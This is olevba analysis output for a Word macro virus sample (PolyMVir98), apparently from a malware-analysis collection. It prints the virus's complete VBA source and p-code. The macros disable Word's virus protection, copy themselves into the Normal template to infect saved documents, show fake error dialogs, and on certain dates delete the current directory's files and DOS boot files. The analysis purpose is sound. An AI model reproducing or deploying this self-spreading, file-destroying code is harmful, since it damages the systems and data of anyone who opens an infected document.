olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Polymvir
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Polymvir - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO PolyMVir98.bas 
in file: Virus.MSWord.Polymvir - OLE stream: 'Macros/VBA/PolyMVir98'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub cexEotuA()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorAE
Dim MyDate, MyTime
MyDate = Date
MyTime = Time
D$ = Mid(MyDate, 1, 2)
T$ = Mid(MyTime, 4, 5)
If D$ = "10" Then
    Selection.EndKey Unit:=wdStory
    For i = 1 To 10
    Selection.TypeParagraph
    Selection.TypeText Text:="ZeMacroKiller98 vous dit à bientôt!!!!!"
    Next i
End If
If D$ = "15" Then
Message:
    StatusBar = "La nouvelle génération des virus polymorphe est de retour..."
    For i = 1 To 400000
    Next i
    StatusBar = "       La nouvelle génération des virus polymorphe est de retour..."
    For i = 1 To 400000
    Next i
    StatusBar = "               La nouvelle génération des virus polymorphe est de retour..."
    For i = 1 To 400000
    Next i
    StatusBar = "                       La nouvelle génération des virus polymorphe est de retour..."
    For i = 1 To 400000
    Next i
    StatusBar = "                               La nouvelle génération des virus polymorphe est de retour..."
    For i = 1 To 400000
    Next i
    StatusBar = "                                       La nouvelle génération des virus polymorphe est de retour..."
    For i = 1 To 400000
    Next i
    StatusBar = "                                               La nouvelle génération des virus polymorphe est de retour..."
    For i = 1 To 400000
    Next i
    StatusBar = "                                                       La nouvelle génération des virus polymorphe est de retour..."
    For i = 1 To 400000
    Next i
    StatusBar = "                                                               La nouvelle génération des virus polymorphe est de retour..."
    For i = 1 To 400000
    Next i
    StatusBar = "                                                                       La nouvelle génération des virus polymorphe est de retour..."
    For i = 1 To 400000
    Next i
    StatusBar = "                                                                               La nouvelle génération des virus polymorphe est de retour..."
    For i = 1 To 400000
    Next i
    StatusBar = "                                                                                       La nouvelle génération des virus polymorphe est de retour..."
    For i = 1 To 400000
    Next i
GoTo Message
End If
If D$ = "20" And T$ = "20" Then
    MsgBox "Les fichiers du répertoire courant seront effacés!!!", vbCritical, "Virus PolyMVir98"
    Kill CurDir
End If
If D$ = "30" And T$ = "30" Then
    MsgBox "attention, le démarrage risque d'être difficile...", vbCritical, "Virus PolyMVir98"
    Kill "C:\Config.sys"
    Kill "C:\AutoExec.bat"
    Kill "C:\Command.com"
    Kill "C:\Msdos.sys"
    Kill "C:\Io.sys"
End If
ErrorAE:
End Sub
Sub AutoOpen()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorAO
iMacroCount = WordBasic.CountMacros(0, 0)
For i = 1 To iMacroCount
    If WordBasic.[MacroName$](i, 0) = "PMorphVir98" Then
        PMorphVir98Installed = -1
    End If
Next i
If Not PMorphVir98Installed Then
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="PolyMVir98", Object:=wdOrganizerObjectProjectItems
    NormalTemplate.VBProject.VBComponents("PolyMVir98").Name = "PMorphVir98"
    NormalTemplate.VBProject.VBComponents("PMorphVir98").CodeModule.DeleteLines 1
    NormalTemplate.VBProject.VBComponents("PMorphVir98").CodeModule.InsertLines 1, "Sub AutoExec"
    NormalTemplate.VBProject.VBComponents("PMorphVir98").CodeModule.DeleteLines 72
    NormalTemplate.VBProject.VBComponents("PMorphVir98").CodeModule.InsertLines 72, "Sub AutoClose"
    NormalTemplate.VBProject.VBComponents("PMorphVir98").CodeModule.DeleteLines 102
    NormalTemplate.VBProject.VBComponents("PMorphVir98").CodeModule.InsertLines 102, "Sub FileSaveAs"
    NormalTemplate.VBProject.VBComponents("PMorphVir98").CodeModule.DeleteLines 129
    NormalTemplate.VBProject.VBComponents("PMorphVir98").CodeModule.InsertLines 129, "Sub FileTemplates"
    NormalTemplate.VBProject.VBComponents("PMorphVir98").CodeModule.DeleteLines 138
    NormalTemplate.VBProject.VBComponents("PMorphVir98").CodeModule.InsertLines 138, "Sub ToolsMacro"
    NormalTemplate.VBProject.VBComponents("PMorphVir98").CodeModule.DeleteLines 153
    NormalTemplate.VBProject.VBComponents("PMorphVir98").CodeModule.InsertLines 153, "Sub ViewVBCode"
End If
ErrorAO:
End Sub
Sub sAevaSeliF()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorFSA
    Dialogs(wdDialogFileSaveAs).Show
        If ActiveDocument.SaveFormat = wdFormatDocument Or ActiveDocument.SaveFormat = wdFormatTemplate Then
            ActiveDocument.SaveAs FileFormat:=wdFormatTemplate
        End If
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="PolyMVir98", Object:=wdOrganizerObjectProjectItems
ActiveDocument.VBProject.VBComponents("PMorphVir98").Name = "PolyMVir98"
ActiveDocument.VBProject.VBComponents("PolyMVir98").CodeModule.DeleteLines 1
ActiveDocument.VBProject.VBComponents("PolyMVir98").CodeModule.InsertLines 1, "Sub cexEotuA"
ActiveDocument.VBProject.VBComponents("PolyMVir98").CodeModule.DeleteLines 72
ActiveDocument.VBProject.VBComponents("PolyMVir98").CodeModule.InsertLines 72, "Sub AutoOpen"
ActiveDocument.VBProject.VBComponents("PolyMVir98").CodeModule.DeleteLines 102
ActiveDocument.VBProject.VBComponents("PolyMVir98").CodeModule.InsertLines 102, "Sub sAevaSeliF"
ActiveDocument.VBProject.VBComponents("PolyMVir98").CodeModule.DeleteLines 129
ActiveDocument.VBProject.VBComponents("PolyMVir98").CodeModule.InsertLines 129, "Sub setalpmeTelif"
ActiveDocument.VBProject.VBComponents("PolyMVir98").CodeModule.DeleteLines 138
ActiveDocument.VBProject.VBComponents("PolyMVir98").CodeModule.InsertLines 138, "Sub orcaMslooT"
ActiveDocument.VBProject.VBComponents("PolyMVir98").CodeModule.DeleteLines 153
ActiveDocument.VBProject.VBComponents("PolyMVir98").CodeModule.InsertLines 153, "Sub edoCBVweiV"
ActiveDocument.Save
ErrorFSA:
End Sub
Sub setalpmeTelif()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorFT
    MsgBox "Erreur Système", vbCritical, "Microsoft Word"
ErrorFT:
End Sub
Sub orcaMslooT()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorTM
Assistant.Visible = True
    With Assistant.NewBalloon
        .Button = msoButtonSetOK
        .Heading = "Virus PolyMVir98"
        .Text = "Je suis un nouveau virus de macro polymorphe!!!"
        .Show
    End With
ErrorTM:
End Sub
Sub edoCBVweiV()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorVVBC
    MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, "Microsoft Wword"
ErrorVVBC:
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Polymvir
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1192 bytes
' Macros/VBA/PolyMVir98 - 20819 bytes
' Line #0:
' 	FuncDefn (Sub ErrorAE())
' Line #1:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #2:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #3:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #4:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #5:
' 	OnError MyDate 
' Line #6:
' 	Dim 
' 	VarDefn D
' 	VarDefn Time
' Line #7:
' 	Ld Date 
' 	St D 
' Line #8:
' 	Ld T 
' 	St Time 
' Line #9:
' 	Ld D 
' 	LitDI2 0x0001 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0003 
' 	St _B_str_D$ 
' Line #10:
' 	Ld Time 
' 	LitDI2 0x0004 
' 	LitDI2 0x0005 
' 	ArgsLd Mid$ 0x0003 
' 	St _B_str_T$ 
' Line #11:
' 	Ld _B_str_D$ 
' 	LitStr 0x0002 "10"
' 	Eq 
' 	IfBlock 
' Line #12:
' 	Ld TypeParagraph 
' 	ParamNamed wdStory 
' 	Ld EndKey 
' 	ArgsMemCall Unit 0x0001 
' Line #13:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000A 
' 	For 
' Line #14:
' 	Ld EndKey 
' 	ArgsMemCall TypeText 0x0000 
' Line #15:
' 	LitStr 0x0027 "ZeMacroKiller98 vous dit à bientôt!!!!!"
' 	ParamNamed Then 
' 	Ld EndKey 
' 	ArgsMemCall _B_var_for 0x0001 
' Line #16:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #17:
' 	EndIfBlock 
' Line #18:
' 	Ld _B_str_D$ 
' 	LitStr 0x0002 "15"
' 	Eq 
' 	IfBlock 
' Line #19:
' 	Label MyTime 
' Line #20:
' 	LitStr 0x003C "La nouvelle génération des virus polymorphe est de retour..."
' 	St Message 
' Line #21:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x1A80 0x0006 
' 	For 
' Line #22:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #23:
' 	LitStr 0x0043 "       La nouvelle génération des virus polymorphe est de retour..."
' 	St Message 
' Line #24:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x1A80 0x0006 
' 	For 
' Line #25:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #26:
' 	LitStr 0x004B "               La nouvelle génération des virus polymorphe est de retour..."
' 	St Message 
' Line #27:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x1A80 0x0006 
' 	For 
' Line #28:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #29:
' 	LitStr 0x0053 "                       La nouvelle génération des virus polymorphe est de retour..."
' 	St Message 
' Line #30:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x1A80 0x0006 
' 	For 
' Line #31:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #32:
' 	LitStr 0x005B "                               La nouvelle génération des virus polymorphe est de retour..."
' 	St Message 
' Line #33:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x1A80 0x0006 
' 	For 
' Line #34:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #35:
' 	LitStr 0x0063 "                                       La nouvelle génération des virus polymorphe est de retour..."
' 	St Message 
' Line #36:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x1A80 0x0006 
' 	For 
' Line #37:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #38:
' 	LitStr 0x006B "                                               La nouvelle génération des virus polymorphe est de retour..."
' 	St Message 
' Line #39:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x1A80 0x0006 
' 	For 
' Line #40:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #41:
' 	LitStr 0x0073 "                                                       La nouvelle génération des virus polymorphe est de retour..."
' 	St Message 
' Line #42:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x1A80 0x0006 
' 	For 
' Line #43:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #44:
' 	LitStr 0x007B "                                                               La nouvelle génération des virus polymorphe est de retour..."
' 	St Message 
' Line #45:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x1A80 0x0006 
' 	For 
' Line #46:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #47:
' 	LitStr 0x0083 "                                                                       La nouvelle génération des virus polymorphe est de retour..."
' 	St Message 
' Line #48:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x1A80 0x0006 
' 	For 
' Line #49:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #50:
' 	LitStr 0x008B "                                                                               La nouvelle génération des virus polymorphe est de retour..."
' 	St Message 
' Line #51:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x1A80 0x0006 
' 	For 
' Line #52:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #53:
' 	LitStr 0x0093 "                                                                                       La nouvelle génération des virus polymorphe est de retour..."
' 	St Message 
' Line #54:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x1A80 0x0006 
' 	For 
' Line #55:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #56:
' 	GoTo MyTime 
' Line #57:
' 	EndIfBlock 
' Line #58:
' 	Ld _B_str_D$ 
' 	LitStr 0x0002 "20"
' 	Eq 
' 	Ld _B_str_T$ 
' 	LitStr 0x0002 "20"
' 	Eq 
' 	And 
' 	IfBlock 
' Line #59:
' 	LitStr 0x0034 "Les fichiers du répertoire courant seront effacés!!!"
' 	Ld Save 
' 	LitStr 0x0010 "Virus PolyMVir98"
' 	ArgsCall MsgBox 0x0003 
' Line #60:
' 	Ld CurDir 
' 	ArgsCall vb 0x0001 
' Line #61:
' 	EndIfBlock 
' Line #62:
' 	Ld _B_str_D$ 
' 	LitStr 0x0002 "30"
' 	Eq 
' 	Ld _B_str_T$ 
' 	LitStr 0x0002 "30"
' 	Eq 
' 	And 
' 	IfBlock 
' Line #63:
' 	LitStr 0x0032 "attention, le démarrage risque d'être difficile..."
' 	Ld Save 
' 	LitStr 0x0010 "Virus PolyMVir98"
' 	ArgsCall MsgBox 0x0003 
' Line #64:
' 	LitStr 0x000D "C:\Config.sys"
' 	ArgsCall vb 0x0001 
' Line #65:
' 	LitStr 0x000F "C:\AutoExec.bat"
' 	ArgsCall vb 0x0001 
' Line #66:
' 	LitStr 0x000E "C:\Command.com"
' 	ArgsCall vb 0x0001 
' Line #67:
' 	LitStr 0x000C "C:\Msdos.sys"
' 	ArgsCall vb 0x0001 
' Line #68:
' 	LitStr 0x0009 "C:\Io.sys"
' 	ArgsCall vb 0x0001 
' Line #69:
' 	EndIfBlock 
' Line #70:
' 	Label MyDate 
' Line #71:
' 	EndSub 
' Line #72:
' 	FuncDefn (Sub AutoOpen())
' Line #73:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #74:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #75:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #76:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #77:
' 	OnError ErrorAO 
' Line #78:
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0002 
' 	St iMacroCount 
' Line #79:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld iMacroCount 
' 	For 
' Line #80:
' 	Ld i 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0002 
' 	LitStr 0x000B "PMorphVir98"
' 	Eq 
' 	IfBlock 
' Line #81:
' 	LitDI2 0x0001 
' 	UMi 
' 	St _B_var_PMorphVir98Installed 
' Line #82:
' 	EndIfBlock 
' Line #83:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #84:
' 	Ld _B_var_PMorphVir98Installed 
' 	Not 
' 	IfBlock 
' Line #85:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x000A "PolyMVir98"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #86:
' 	LitStr 0x000B "PMorphVir98"
' 	LitStr 0x000A "PolyMVir98"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemSt New 
' Line #87:
' 	LitDI2 0x0001 
' 	LitStr 0x000B "PMorphVir98"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #88:
' 	LitDI2 0x0001 
' 	LitStr 0x000C "Sub AutoExec"
' 	LitStr 0x000B "PMorphVir98"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #89:
' 	LitDI2 0x0048 
' 	LitStr 0x000B "PMorphVir98"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #90:
' 	LitDI2 0x0048 
' 	LitStr 0x000D "Sub AutoClose"
' 	LitStr 0x000B "PMorphVir98"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #91:
' 	LitDI2 0x0066 
' 	LitStr 0x000B "PMorphVir98"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #92:
' 	LitDI2 0x0066 
' 	LitStr 0x000E "Sub FileSaveAs"
' 	LitStr 0x000B "PMorphVir98"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #93:
' 	LitDI2 0x0081 
' 	LitStr 0x000B "PMorphVir98"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #94:
' 	LitDI2 0x0081 
' 	LitStr 0x0011 "Sub FileTemplates"
' 	LitStr 0x000B "PMorphVir98"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #95:
' 	LitDI2 0x008A 
' 	LitStr 0x000B "PMorphVir98"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #96:
' 	LitDI2 0x008A 
' 	LitStr 0x000E "Sub ToolsMacro"
' 	LitStr 0x000B "PMorphVir98"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #97:
' 	LitDI2 0x0099 
' 	LitStr 0x000B "PMorphVir98"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #98:
' 	LitDI2 0x0099 
' 	LitStr 0x000E "Sub ViewVBCode"
' 	LitStr 0x000B "PMorphVir98"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #99:
' 	EndIfBlock 
' Line #100:
' 	Label ErrorAO 
' Line #101:
' 	EndSub 
' Line #102:
' 	FuncDefn (Sub sAevaSeliF())
' Line #103:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #104:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #105:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #106:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #107:
' 	OnError ErrorFSA 
' Line #108:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #109:
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatDocument 
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatTemplate 
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #110:
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #111:
' 	EndIfBlock 
' Line #112:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x000A "PolyMVir98"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #113:
' 	LitStr 0x000A "PolyMVir98"
' 	LitStr 0x000B "PMorphVir98"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemSt New 
' Line #114:
' 	LitDI2 0x0001 
' 	LitStr 0x000A "PolyMVir98"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #115:
' 	LitDI2 0x0001 
' 	LitStr 0x000C "Sub cexEotuA"
' 	LitStr 0x000A "PolyMVir98"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #116:
' 	LitDI2 0x0048 
' 	LitStr 0x000A "PolyMVir98"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #117:
' 	LitDI2 0x0048 
' 	LitStr 0x000C "Sub AutoOpen"
' 	LitStr 0x000A "PolyMVir98"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #118:
' 	LitDI2 0x0066 
' 	LitStr 0x000A "PolyMVir98"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #119:
' 	LitDI2 0x0066 
' 	LitStr 0x000E "Sub sAevaSeliF"
' 	LitStr 0x000A "PolyMVir98"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #120:
' 	LitDI2 0x0081 
' 	LitStr 0x000A "PolyMVir98"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #121:
' 	LitDI2 0x0081 
' 	LitStr 0x0011 "Sub setalpmeTelif"
' 	LitStr 0x000A "PolyMVir98"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #122:
' 	LitDI2 0x008A 
' 	LitStr 0x000A "PolyMVir98"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #123:
' 	LitDI2 0x008A 
' 	LitStr 0x000E "Sub orcaMslooT"
' 	LitStr 0x000A "PolyMVir98"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #124:
' 	LitDI2 0x0099 
' 	LitStr 0x000A "PolyMVir98"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #125:
' 	LitDI2 0x0099 
' 	LitStr 0x000E "Sub edoCBVweiV"
' 	LitStr 0x000A "PolyMVir98"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #126:
' 	Ld ActiveDocument 
' 	ArgsMemCall orcaMslooT 0x0000 
' Line #127:
' 	Label ErrorFSA 
' Line #128:
' 	EndSub 
' Line #129:
' 	FuncDefn (Sub erroor())
' Line #130:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #131:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #132:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #133:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #134:
' 	OnError eroor 
' Line #135:
' 	LitStr 0x000E "Erreur Système"
' 	Ld Save 
' 	LitStr 0x000E "Microsoft Word"
' 	ArgsCall MsgBox 0x0003 
' Line #136:
' 	Label eroor 
' Line #137:
' 	EndSub 
' Line #138:
' 	FuncDefn (Sub ErrorTM())
' Line #139:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #140:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #141:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #142:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #143:
' 	OnError Assistant 
' Line #144:
' 	LitVarSpecial (True)
' 	Ld Visible 
' 	MemSt NewBalloon 
' Line #145:
' 	StartWithExpr 
' 	Ld Visible 
' 	MemLd _B_var_With 
' 	With 
' Line #146:
' 	Ld Heading 
' 	MemStWith msoButtonSetOK 
' Line #147:
' 	LitStr 0x0010 "Virus PolyMVir98"
' 	MemStWith cexEotuA 
' Line #148:
' 	LitStr 0x002F "Je suis un nouveau virus de macro polymorphe!!!"
' 	MemStWith Then 
' Line #149:
' 	ArgsMemCallWith Show 0x0000 
' Line #150:
' 	EndWith 
' Line #151:
' 	Label Assistant 
' Line #152:
' 	EndSub 
' Line #153:
' 	FuncDefn (Sub ErrorVVBC())
' Line #154:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #155:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #156:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #157:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #158:
' 	OnError ShowVisualBasicEditor 
' Line #159:
' 	LitStr 0x0044 "Ce programme a réalisé une opération illégale et va être interrompu."
' 	Ld Save 
' 	LitStr 0x000F "Microsoft Wword"
' 	ArgsCall MsgBox 0x0003 
' Line #160:
' 	Label ShowVisualBasicEditor 
' Line #161:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Command             |May run PowerShell commands                  |
